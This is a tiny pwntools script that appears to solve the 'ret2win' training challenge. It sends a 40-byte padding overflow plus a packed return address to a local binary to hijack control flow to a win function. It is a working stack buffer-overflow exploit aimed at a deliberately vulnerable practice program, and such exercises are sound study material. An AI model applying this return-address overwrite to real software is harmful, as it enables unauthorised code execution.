from pwn import *

p=process("./ret2win")
p.recv()
p.sendline(b"A"*40 + p64(0x00400756))
m=p.recv()
print(m)
